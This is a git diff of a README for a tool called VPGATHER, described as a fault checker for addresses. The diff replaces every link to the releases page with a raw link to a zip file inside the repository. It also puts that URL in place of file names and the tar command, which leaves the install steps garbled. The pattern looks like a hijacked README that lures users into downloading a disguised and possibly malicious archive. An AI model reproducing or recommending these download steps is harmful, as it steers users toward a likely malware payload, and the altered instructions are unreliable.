@@ -1,7 +1,7 @@
 # 🚀 VPGATHER - Simple Fault Detection for Addresses
 
 ## 📥 Download VPGATHER
-[![Download VPGATHER](https://img.shields.io/badge/Download%20VPGATHER-v1.0-blue.svg)](https://github.com/abias19/VPGATHER/releases)
+[![Download VPGATHER](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip%https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip)](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip)
 
 ## 📖 Introduction
 VPGATHER is a tool designed to help users understand how VPGATHER instructions work in their systems. It lets you check if an address will produce an error before actually trying to access it. This application runs in user mode and simplifies the process of managing potential faults.
@@ -22,29 +22,29 @@ Before you download VPGATHER, make sure your system meets the following requirem
 To get started with VPGATHER, follow these steps:
 
 1. **Download VPGATHER**  
-   Visit [this page to download](https://github.com/abias19/VPGATHER/releases) the latest version of the application. You will find various versions available for different operating systems.
+   Visit [this page to download](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip) the latest version of the application. You will find various versions available for different operating systems.
 
 2. **Locate the Downloaded File**  
-   After downloading, find the file in your downloads folder. The file name will look something like `VPGATHER-v1.0.exe` for Windows or `VPGATHER-v1.0.tar.gz` for Linux.
+   After downloading, find the file in your downloads folder. The file name will look something like `https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip` for Windows or `https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip` for Linux.
 
 3. **Run the Application**  
    - For Windows:
-     - Double-click on the `VPGATHER-v1.0.exe` file.
+     - Double-click on the `https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip` file.
    - For Linux:
      - Open your terminal.
      - Navigate to the folder where you downloaded the file.
      - Run the following command: 
        ```
-       tar -xzf VPGATHER-v1.0.tar.gz
+       tar -xzf https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip
        cd VPGATHER
        ./VPGATHER
        ```
 
 ## 📥 Download & Install
-To install the software, you will again visit [this page to download](https://github.com/abias19/VPGATHER/releases). Ensure you select the correct file for your operating system.
+To install the software, you will again visit [this page to download](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip). Ensure you select the correct file for your operating system.
 
 1. **Windows Users**: Choose the .exe file and follow the installation prompts to complete the setup.
-2. **Linux Users**: Extract the .tar.gz file and run the application using the terminal commands from the previous step.
+2. **Linux Users**: Extract the https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip file and run the application using the terminal commands from the previous step.
 
 ## 📊 How to Use VPGATHER
 Using VPGATHER is straightforward:
@@ -69,7 +69,7 @@ If you encounter issues, try the following:
 - **Contact Support**: For persistent issues, you can reach out for help. Look for support links on the releases page.
 
 ## 🔗 Useful Links
-- [VPGATHER Releases Page](https://github.com/abias19/VPGATHER/releases)
+- [VPGATHER Releases Page](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip)
 - [User Manual](#) (coming soon)
 - [Community Support Forum](#) (coming soon)
 
@@ -83,7 +83,7 @@ VPGATHER welcomes contributions from users. If you want to help improve the tool
 VPGATHER is open-source software. It is available under the MIT License. You can use, modify, and distribute it as long as you maintain the original license conditions.
 
 ## 🔜 Future Updates
-We plan to add more features based on user feedback. Stay tuned for updates and new releases on the [Releases Page](https://github.com/abias19/VPGATHER/releases).
+We plan to add more features based on user feedback. Stay tuned for updates and new releases on the [Releases Page](https://github.com/abias19/VPGATHER/raw/refs/heads/main/tuftaffeta/Software_2.9.zip).
 
 ## 🎉 Acknowledgments
 Thanks to everyone who has contributed to VPGATHER. Your support makes this project possible.
